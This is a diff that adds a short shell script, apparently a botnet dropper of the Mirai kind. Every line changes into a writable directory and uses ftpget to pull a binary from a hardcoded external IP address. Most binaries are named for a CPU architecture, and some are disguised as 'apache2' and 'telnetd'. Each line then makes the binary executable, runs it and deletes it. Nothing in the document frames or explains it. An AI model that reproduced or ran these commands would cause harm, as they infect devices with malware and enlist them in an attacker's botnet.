@@ -1,0 +1,13 @@
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 204.44.82.21 kyuremmips kyuremmips; chmod 777 kyuremmips ./kyuremmips; rm -rf kyuremmips
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 204.44.82.21 kyuremmipsel kyuremmipsel; chmod 777 kyuremmipsel ./kyuremmipsel; rm -rf kyuremmipsel
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 204.44.82.21 kyuremsh4 kyuremsh4; chmod 777 kyuremsh4 ./kyuremsh4; rm -rf kyuremsh4
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 204.44.82.21 kyuremx86 kyuremx86; chmod 777 kyuremx86 ./kyuremx86; rm -rf kyuremx86
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 204.44.82.21 kyuremarmv6l kyuremarmv6l; chmod 777 kyuremarmv6l ./kyuremarmv6l; rm -rf kyuremarmv6l
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 204.44.82.21 kyuremi686 kyuremi686; chmod 777 kyuremi686 ./kyuremi686; rm -rf kyuremi686
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 204.44.82.21 kyuremppc kyuremppc; chmod 777 kyuremppc ./kyuremppc; rm -rf kyuremppc
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 204.44.82.21 kyuremi586 kyuremi586; chmod 777 kyuremi586 ./kyuremi586; rm -rf kyuremi586
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 204.44.82.21 kyuremm68k kyuremm68k; chmod 777 kyuremm68k ./kyuremm68k; rm -rf kyuremm68k
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 204.44.82.21 kyuremsparc kyuremsparc; chmod 777 kyuremsparc ./kyuremsparc; rm -rf kyuremsparc
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 204.44.82.21 ' ' ' '; chmod 777 ' ' ./' '; rm -rf ' '
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 204.44.82.21 apache2 apache2; chmod 777 apache2 ./apache2; rm -rf apache2
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 204.44.82.21 telnetd telnetd; chmod 777 telnetd ./telnetd; rm -rf telnetd
